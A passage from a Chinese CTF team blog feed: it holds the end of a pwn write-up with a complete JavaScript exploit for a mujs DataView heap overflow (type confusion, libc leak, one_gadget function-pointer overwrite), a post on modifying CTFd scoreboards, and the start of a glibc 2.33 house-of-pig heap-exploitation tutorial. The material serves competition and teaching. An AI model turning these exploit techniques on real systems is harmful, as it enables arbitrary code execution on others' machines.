&#123;</span></span><br><span class="line">                        js_Object *target;</span><br><span class="line">                        js_Iterator *head;</span><br><span class="line">                &#125; iter;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">const</span> <span class="keyword">char</span> *tag;</span><br><span class="line">                        <span class="keyword">void</span> *data;</span><br><span class="line">                        js_HasProperty has;</span><br><span class="line">                        js_Put put;</span><br><span class="line">                        js_Delete <span class="keyword">delete</span>;</span><br><span class="line">                        js_Finalize finalize;</span><br><span class="line">                &#125; user;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="keyword">uint32_t</span> length;</span><br><span class="line">                    <span class="keyword">uint8_t</span>* data;</span><br><span class="line">                &#125; dataview;</span><br><span class="line">        &#125; u;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>比如<code>js_Object.u.dataview.length</code> 在结构体内所处的偏移是和<code>js_Object.u.number</code> 以及<code>s_Object.u.c.name</code>这两个是相同的。</p>
<p>所以我们可以修改<code>js_Object.u.number</code>，队友找到了下面的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">js_setdate</span><span class="params">(js_State *J, <span class="keyword">int</span> idx, <span class="keyword">double</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        js_Object *self = js_toobject(J, idx);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;type != JS_CDATE)</span><br><span class="line">                js_typeerror(J, <span class="string">"not a date"</span>);</span><br><span class="line">        self-&gt;u.number = TimeClip(t);</span><br><span class="line">        js_pushnumber(J, self-&gt;u.number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... called from here</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dp_setTime</span><span class="params">(js_State *J)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        js_setdate(J, <span class="number">0</span>, js_tonumber(J, <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们试一下</p>
<p><code>JS_CDATE</code>的值是10，我们需要把这个DataView结构的type字段溢出成10就可以了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set type of c to Date</span></span><br><span class="line">print(c)</span><br><span class="line">c.setTime(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[object DataView]</span><br><span class="line">[object Date]</span><br><span class="line">TypeError: undefined is not callable</span><br><span class="line">        at tconf.js:10</span><br></pre></td></tr></table></figure>

<p>Emmm，居然是报错了。难道进行了类型混淆还是不能调用setTime方法么？队友曾经为了这个问题困扰了许久，他意识到了对象的prototype 在我们一创建的时候其实就已经确定了。所以当我们改变type的时候prototype并没有改变。而prototype基本就已经定义了这个对象可以调用哪些方法，可恶。</p>
<p>这时无敌的队友发现，js里有个讨厌的东西叫 <code>this</code>，这个东西在这个时候算是雪中送碳吧</p>
<p>我们仍然可以通过js的<code>bind</code>调用<code>setTime</code> :</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>

<p>成功了！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set type of c to Date</span></span><br><span class="line">print(c)</span><br><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">1.09522e+12</span>)</span><br><span class="line"></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// type of c back to DataView</span></span><br><span class="line">print(c.getLength())</span><br></pre></td></tr></table></figure>

<p>看到这里大家可能会有些疑问，就是<code>u.number</code>是8字节的<code>double</code>类型，而我们要覆盖的<code>u.dataview.length</code>只有四字节，这样会不会覆盖到后面紧跟着的四字节的<code>u.dataview.data</code>，毕竟这个是个指针，覆盖掉了容易导致crash。其实是不会的，因为这个结构体有8字节对齐。</p>
<h3 id="使用堆上的越界读写来实现代码执行"><a href="#使用堆上的越界读写来实现代码执行" class="headerlink" title="使用堆上的越界读写来实现代码执行"></a>使用堆上的越界读写来实现代码执行</h3><p>到了这个阶段，我们已经可以通过修改dataview的length字段来实现堆上的任意地址读写了。并且堆布局也是我们相对可控的了。为了更好的控制堆上的结构，我的队友在<code>c</code>后面又申请了两个Dataview。并且我们知道，如果我们申请的堆的大小大于128k的话我们会使用mmap来申请空间，这个是malloc函数的一个策略。而这个mapp的地址往往距离libc地址很近，因此我们可以通过这种方法来泄漏libc基地址。</p>
<p>所以我们用上述的方法泄漏了libc地址之后，可以伪造一个<code>JS_CCFUNCTION</code>类型，他有一个字段叫做<code>u.c.function</code>我们可以轻易用下面的方式调用这个函数指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">js_call</span><span class="params">(js_State *J, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">                        jsR_callfunction(J, n, obj-&gt;u.f.function, obj-&gt;u.f.scope);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">e = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">f = <span class="built_in">DataView</span>(<span class="number">0x1000</span> * <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">10</span>); <span class="comment">// set c type to Date</span></span><br><span class="line"><span class="built_in">Date</span>.prototype.setTime.bind(c)(<span class="number">1.09522e+12</span>) <span class="comment">// write number + length</span></span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">16</span>); <span class="comment">// set c type back to DataView</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">4294967296</span> <span class="comment">// 1&lt;&lt;32</span></span><br><span class="line">libb_addr_off = <span class="number">472</span></span><br><span class="line">libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+<span class="number">4</span>)*sh32)</span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x7ffff7c31000</span> - <span class="number">0x7ffff6bfe010</span> <span class="comment">// got this from gdb</span></span><br><span class="line">libc_base = libc_leak + libc_off</span><br><span class="line">print(<span class="string">'libc base:'</span>, libc_base.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">one_gag = libc_base + <span class="number">0xe6c84</span></span><br><span class="line">print(<span class="string">'onegadget:'</span>, one_gag.toString(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">e_obj_off = <span class="number">192</span></span><br><span class="line">c.setUint8(<span class="number">160</span>, <span class="number">4</span>) <span class="comment">// this sets type to JS_CCFUNCTION</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set lower 4 bytes of js_CFunction function</span></span><br><span class="line">c.setUint32(e_obj_off+<span class="number">8</span>, one_gag&amp;<span class="number">0xffffffff</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">// set upper 4 bytes of js_CFunction function</span></span><br><span class="line">c.setUint32(e_obj_off+<span class="number">8</span>+<span class="number">4</span>, <span class="built_in">Math</span>.floor(one_gag/sh32)&amp;<span class="number">0xffffffff</span>) </span><br><span class="line">e() <span class="comment">// e is now a function so we can call it</span></span><br></pre></td></tr></table></figure>

<p>队友表示他之前也没做过这种mujs的利用，但是这些堆利用的基本思路和很多大型项目比如v8的利用是共通的，但是那些大型项目由于运行时更为复杂，堆空间要相对更不可控一些。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>堆</tag>
        <tag>pwn writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>NUAACTF靶场搭建总结</title>
    <url>/year/01/17/cl7iordp5001o293fy0e7wvl3/</url>
    <content><![CDATA[<p>这次NUAACTF面向所有高校参赛，因此使用了ctfd的whale插件来实现动态flag，然后又对ctfd进行一些魔改，实现校外校内榜分开排名的功能。</p>
<p>部署参考文章 <a href="https://vaala.cat/2020/09/21/ctfd使用ctfd-whale动态靶机插件搭建靶场指南/" target="_blank" rel="noopener">ctfd使用ctfd-whale动态靶机插件搭建靶场指南 | VaalaCat</a></p>
<p>修改好的代码推到了 <a href="https://github.com/Asuri-Team/NUAA-CTfd" target="_blank" rel="noopener">Asuri-Team/NUAA-CTfd (github.com)</a></p>
<a id="more"></a>

<h1 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h1><p><img src="https://miaotony.xyz/2021/12/16/CTF_2021AsuriCTF_NUAACTF_Misc/haibao2.png" alt></p>
<blockquote>
<p><strong>第六届南京航空航天大学网络攻防大赛</strong></p>
<p><strong>AsuriCTF / NUAACTF 2021</strong></p>
<p><strong>承办单位：</strong>由南京航空航天大学信息化处、南京航空航天大学教务处、共青团南京航空航天大学委员会指导，南京航空航天大学计算机科学与技术学院承办，Asuri信息安全战队，南京航空航天大学学生网络安全与信息技术协会协办，奇安信科技集团股份有限公司独家赞助。</p>
<p><strong>活动对象：</strong>南京航空航天大学全体学生，校外对信息安全感兴趣的同学。</p>
<p><strong>报名时间：</strong>2021年11月22日0:00-12月6日12:00</p>
<p><strong>比赛时间：</strong>2021年12月11日13:00-18:00（最后实际是到 19:00）</p>
</blockquote>
<p>作为这次NUAACTF的举办者，有一说一办比赛是真的烦。拉赞助，协调学校场地，做宣传等焦头烂额。而且最后因为疫情缘故不得不改成了线上，而且最后还有很多没做到位的地方。但想想去年这个时候，我们就是与miao师傅在校赛上相识，从此到深圳，郑州一起快乐比赛。自己也是从校赛入门，一起和朱师傅共同学习PWN方向。如果没有校赛，没有曹师傅，朱师傅，帆哥哥，我可能也不会接触到ctf，也没有动力继续走下去。希望校赛能越办越好，大家都能从校赛里获得快乐，提升技术，找到志同道合的伙伴一起进步。</p>
<h1 id="0x01-针对校赛对ctfd进行的二次开发"><a href="#0x01-针对校赛对ctfd进行的二次开发" class="headerlink" title="0x01 针对校赛对ctfd进行的二次开发"></a>0x01 针对校赛对ctfd进行的二次开发</h1><h2 id="ScoreBoard"><a href="#ScoreBoard" class="headerlink" title="ScoreBoard"></a>ScoreBoard</h2><h3 id="校内外分类"><a href="#校内外分类" class="headerlink" title="校内外分类"></a>校内外分类</h3><p>基于注册时填写的<code>Affiliation</code>字段进行分类，这里只对填写值为NUAA的人员判定为校内人员，其他都是校外人员。注意此字段因为我魔改时候的bug，即使校外人员注册也不要填为空，不然会在查询时索引不到，最好设置一个默认初始值。</p>
<p>下面是具体更改：</p>
<p>首先在<code>/CTFd/CTFd/themes/core/templates/scoreboard.html</code>添加下拉框：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control custom-select w-10"</span> <span class="attr">onchange</span>=<span class="string">"top.location.href=this.value"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/"</span>&gt;</span>排名方式<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/scoreboard"</span>&gt;</span>总排名<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/scoreboard/1"</span>&gt;</span>校内排名<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"/scoreboard/2"</span>&gt;</span>校外排名<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>更改<code>/CTFd/utils/scores/__init__.py</code> 里的<code>get_standings 查</code>询方式：</p>
<h3 id="增加参数"><a href="#增加参数" class="headerlink" title="增加参数"></a>增加参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@cache.memoize(timeout=60)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_standings</span><span class="params">(count=None, admin=False, fields=None, request=<span class="number">0</span>)</span>:</span></span><br></pre></td></tr></table></figure>

<h3 id="分情况查询"><a href="#分情况查询" class="headerlink" title="分情况查询"></a>分情况查询</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     <span class="keyword">if</span> request == <span class="number">0</span>:</span><br><span class="line">         standings_query = (</span><br><span class="line">             db.session.query(</span><br><span class="line">                 Model.id.label(<span class="string">"account_id"</span>),</span><br><span class="line">                 Model.oauth_id.label(<span class="string">"oauth_id"</span>),</span><br><span class="line">                 Model.name.label(<span class="string">"name"</span>),</span><br><span class="line">                 Model.affiliation.label(<span class="string">"affiliation"</span>),</span><br><span class="line">                 sumscores.columns.score,</span><br><span class="line">                 *fields,</span><br><span class="line">             )</span><br><span class="line">             .join(sumscores, Model.id == sumscores.columns.account_id)</span><br><span class="line">             .filter(Model.banned == <span class="literal">False</span>, Model.hidden == <span class="literal">False</span>)</span><br><span class="line">             .order_by(sumscores.columns.score.desc(), sumscores.columns.id)</span><br><span class="line">         )</span><br><span class="line">     <span class="keyword">elif</span> request == <span class="number">1</span>:</span><br><span class="line">         standings_query = (</span><br><span class="line">             db.session.query(</span><br><span class="line">                 Model.id.label(<span class="string">"account_id"</span>),</span><br><span class="line">                 Model.oauth_id.label(<span class="string">"oauth_id"</span>),</span><br><span class="line">                 Model.name.label(<span class="string">"name"</span>),</span><br><span class="line">                 Model.affiliation.label(<span class="string">"affiliation"</span>),</span><br><span class="line">                 sumscores.columns.score,</span><br><span class="line">                 *fields,</span><br><span class="line">                 )</span><br><span class="line">                 .join(sumscores, Model.id == sumscores.columns.account_id)</span><br><span class="line">                 .filter(Model.banned == <span class="literal">False</span>, Model.hidden == <span class="literal">False</span>, Model.affiliation == <span class="string">"NUAA"</span>)</span><br><span class="line">                 .order_by(sumscores.columns.score.desc(), sumscores.columns.id)</span><br><span class="line">             )</span><br><span class="line">     <span class="keyword">elif</span> request == <span class="number">2</span>:</span><br><span class="line">         standings_query = (</span><br><span class="line">             db.session.query(</span><br><span class="line">                 Model.id.label(<span class="string">"account_id"</span>),</span><br><span class="line">                 Model.oauth_id.label(<span class="string">"oauth_id"</span>),</span><br><span class="line">                 Model.name.label(<span class="string">"name"</span>),</span><br><span class="line">                 Model.affiliation.label(<span class="string">"affiliation"</span>),</span><br><span class="line">                 sumscores.columns.score,</span><br><span class="line">                 *fields,</span><br><span class="line">             )</span><br><span class="line">                 .join(sumscores, Model.id == sumscores.columns.account_id)</span><br><span class="line">                 .filter(Model.banned == <span class="literal">False</span>, Model.hidden == <span class="literal">False</span>, Model.affiliation != <span class="string">"NUAA"</span>)</span><br><span class="line">                 .order_by(sumscores.columns.score.desc(), sumscores.columns.id)</span><br><span class="line">         )</span><br></pre></td></tr></table></figure>

<p>默认总榜是0，校内是1，校外是2</p>
<p>然后在<code>/CTFd/scoredboard.py</code> 添加路由:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@scoreboard.route("/scoreboard")</span></span><br><span class="line"><span class="meta">@check_score_visibility</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listing</span><span class="params">()</span>:</span></span><br><span class="line">    infos = get_infos()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> config.is_scoreboard_frozen():</span><br><span class="line">        infos.append(<span class="string">"Scoreboard has been frozen"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_admin() <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> scores_visible() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        infos.append(<span class="string">"Scores are not currently visible to users"</span>)</span><br><span class="line">    clear_standings()</span><br><span class="line">    standings = get_standings()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"scoreboard.html"</span>, standings=standings, infos=infos)</span><br><span class="line"></span><br><span class="line"><span class="meta">@scoreboard.route("/scoreboard/1")</span></span><br><span class="line"><span class="meta">@check_score_visibility</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listing1</span><span class="params">()</span>:</span></span><br><span class="line">    infos = get_infos()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> config.is_scoreboard_frozen():</span><br><span class="line">        infos.append(<span class="string">"Scoreboard has been frozen"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_admin() <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> scores_visible() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        infos.append(<span class="string">"Scores are not currently visible to users"</span>)</span><br><span class="line">    clear_standings()</span><br><span class="line">    standings = get_standings(<span class="literal">None</span>, <span class="literal">False</span>, request=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">"scoreboard.html"</span>,</span><br><span class="line">        standings=standings,</span><br><span class="line">        infos=infos</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@scoreboard.route("/scoreboard/2")</span></span><br><span class="line"><span class="meta">@check_score_visibility</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listing2</span><span class="params">()</span>:</span></span><br><span class="line">    infos = get_infos()</span><br><span class="line">    <span class="keyword">if</span> config.is_scoreboard_frozen():</span><br><span class="line">        infos.append(<span class="string">"Scoreboard has been frozen"</span>)</span><br><span class="line">    <span class="keyword">if</span> is_admin() <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> scores_visible() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        infos.append(<span class="string">"Scores are not currently visible to users"</span>)</span><br><span class="line">    clear_standings()</span><br><span class="line">    standings = get_standings(<span class="literal">None</span>, <span class="literal">False</span>, request=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">"scoreboard.html"</span>,</span><br><span class="line">        standings=standings,</span><br><span class="line">        infos=infos</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<h3 id="计分图版"><a href="#计分图版" class="headerlink" title="计分图版"></a>计分图版</h3><p><code>/CTFd/CTFd/api/v1/scoreboard.py</code>, 对接口请求时的url进行分类，先添加<code>request</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br></pre></td></tr></table></figure>

<p>然后对接口 <code>@scoreboard_namespace.route(&quot;/top/&lt;count&gt;&quot;)</code>里进行修改，添加</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@scoreboard_namespace.route("/top/&lt;count&gt;")</span></span><br><span class="line"><span class="meta">@scoreboard_namespace.param("count", "How many top teams to return")</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScoreboardDetail</span><span class="params">(Resource)</span>:</span></span><br><span class="line"><span class="meta">    @check_account_visibility</span></span><br><span class="line"><span class="meta">    @check_score_visibility</span></span><br><span class="line"><span class="meta">    @cache.cached(timeout=60, key_prefix=make_cache_key)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, count)</span>:</span></span><br><span class="line">        clear_standings()</span><br><span class="line">        response = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"/scoreboard/1"</span> <span class="keyword">in</span> request.headers[<span class="string">'Referer'</span>]:</span><br><span class="line">           board_type = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"/scoreboard/2"</span> <span class="keyword">in</span> request.headers[<span class="string">'Referer'</span>]:</span><br><span class="line">           board_type = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">           board_type = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        standings = get_standings(count=count, request=board_type)</span><br></pre></td></tr></table></figure>

<p>然后将 get_standings 的参数改成<code>standings = get_standings(count=count, request=board_type)</code></p>
<h3 id="一些还没来的及实现的功能"><a href="#一些还没来的及实现的功能" class="headerlink" title="一些还没来的及实现的功能"></a>一些还没来的及实现的功能</h3><ul>
<li><p>前三血自动播报</p>
</li>
<li><p>在解题面板区分校内和校外</p>
<p>## </p>
</li>
</ul>
<h1 id="0x02-赛后反思"><a href="#0x02-赛后反思" class="headerlink" title="0x02 赛后反思"></a>0x02 赛后反思</h1><h2 id="题目难度"><a href="#题目难度" class="headerlink" title="题目难度"></a>题目难度</h2><p>最后pwn题只有两道题目有解，感觉后面出题可以效仿中科大，不必拘泥于ctf形式，还是以简单有趣为主。让更多的人有参与感，能学到东西。题面上可以多给提示</p>
<h2 id="服务器运维"><a href="#服务器运维" class="headerlink" title="服务器运维"></a>服务器运维</h2><ul>
<li>采用4c8g服务器，1000Mb带宽，刚开始带宽开小了导致平台非常卡。</li>
<li>题目与平台都在一个服务器上，cpu负载很高，下次可以分布式部署</li>
</ul>
]]></content>
      <tags>
        <tag>平台部署</tag>
      </tags>
  </entry>
  <entry>
    <title>2.33下的house of pig</title>
    <url>/year/11/22/cl7iordm40001293fb1vot3or/</url>
    <content><![CDATA[<p>以最近在西湖论剑上碰到的题目，TinyNode来记录下libc2-33下，house of pig的利用流程</p>
<a id="more"></a>

<h2 id="0x01-house-of-pig"><a href="#0x01-house-of-pig" class="headerlink" title="0x01 house of pig"></a>0x01 house of pig</h2><h3 id="1-1-利用条件"><a href="#1-1-利用条件" class="headerlink" title="1.1 利用条件"></a>1.1 利用条件</h3><ul>
<li>至少存在uaf</li>
<li>程序可通过某种方式退出<ol>
<li>当 libc 执行abort流程时。</li>
<li>程序显式调用 exit 。</li>
<li>程序能通过主函数返回。</li>
</ol>
</li>
</ul>
<h3 id="1-2-利用思路"><a href="#1-2-利用思路" class="headerlink" title="1.2 利用思路"></a>1.2 利用思路</h3><p><code>house of pig</code>的利用思路就是，利用一个<code>堆地址任意地址写</code>，将<code>_IO_list_all</code>或者某个<code>IO_FILE</code>的<code>chain</code>字段，覆写为一个我们可以控制的堆地址，并在这个堆地址上伪造<code>IO_FILE</code>结构。当程序退出前会调用<code>_IO_flush_all_lockp</code>函数来flush所有IO流，当flush到我们伪造的IO_FILE结构时因为其参数和结构都是我们可控的，因此可以达到劫持控制流的目的。</p>
<p>在该堆地址构造 FILE 结构的时候，重点是将其<code>vtable</code>由 <code>_IO_file_jumps</code>修改为 <code>_IO_str_jumps</code>，那么当原本应该调用<code>IO_file_overflow</code>的时候，就会转而调用如下的<code>IO_str_overflow</code>。而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc、memcpy、free 函数（如下图），且三个函数的参数又都可以被该 FILE 结构中的数据控制。</p>
<p><img src="https://p1.ssl.qhimg.com/t012d5dfc2cc6ca71b9.png" alt></p>
<p><img src="https://p3.ssl.qhimg.com/t013bff2b8a70730476.png" alt></p>
<p>我们可以先通过malloc把提前放在tcache里的<code>__free_hook</code>取出来，然后利用memcpy将<code>__free_hook</code>修改为<code>setcontext + 61</code>，后面再调用free_hook触发SROP执行mprotect，再跳转到shellcode上完成整个orw的过程。</p>
<h3 id="1-3-libc2-33新增的保护"><a href="#1-3-libc2-33新增的保护" class="headerlink" title="1.3 libc2-33新增的保护"></a>1.3 libc2-33新增的保护</h3><p>除了2.32增加的对tache的指针进行一个异或它本身地址右移12位的操作之外，还新增了申请新地址时必须满足0x10对齐的限制。</p>
<h2 id="0x02-西湖论剑2021-TinyNote"><a href="#0x02-西湖论剑2021-TinyNote" class="headerlink" title="0x02 西湖论剑2021 TinyNote"></a>0x02 西湖论剑2021 TinyNote</h2><h3 id="2-1-题目分析"><a href="#2-1-题目分析" class="headerlink" title="2.1 题目分析"></a>2.1 题目分析</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>大概来看有四个功能，add，show，edit，delete</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_126F();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>add功能是只可以申请0x10大小的chunk，而且sub_141E函数对malloc进行了一个封装，禁止我们申请堆空间以外的地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1240(<span class="string">"Index:"</span>);</span><br><span class="line">  LODWORD(v0) = sub_1465();</span><br><span class="line">  idx = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="keyword">void</span> *)sub_141E(<span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1240(<span class="string">"internal error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v0 = chunk_buf;</span><br><span class="line">    chunk_buf[idx] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>show没什么好说的，中规中矩的一个泄漏</p>
